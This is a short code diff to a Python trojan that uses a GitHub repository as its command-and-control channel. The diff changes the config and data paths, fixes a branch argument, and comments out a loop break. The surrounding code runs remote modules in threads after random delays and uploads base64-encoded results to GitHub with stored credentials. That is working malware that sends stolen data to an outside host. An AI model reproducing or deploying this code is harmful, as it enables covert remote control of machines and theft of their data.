@@ -10,8 +10,8 @@ import time
 
 trojan_id = "abc"
 
-trojan_config = "config/%s.json" % trojan_id
-data_path = "data/%s/" % trojan_id
+trojan_config = "contents6/trojan/config/%s.json" % trojan_id
+data_path = "contents6/trojan/data/%s/" % trojan_id
 trojan_modules = []
 configured = False
 usr = None
@@ -58,7 +58,7 @@ def store_module_result(data):
     global usr, psw
     gh,repo,branch = connect_to_github(usr, psw)
     remote_path = "data/%s/%d.data" % (trojan_id, random.randint(1000,100000))
-    repo.create_file(remote_path, "Commit message", base64.b64encode(data), branch)
+    repo.create_file(remote_path, "Commit message", base64.b64encode(data), branch.name)
     return
 
 
@@ -109,6 +109,7 @@ def main_trojan_loop():
             t = threading.Thread(target=module_runner, args=(task['module'],))
             t.start()
             time.sleep(random.randint(1,10))
+        #break
 
     time.sleep(random.randint(1000,10000))
 
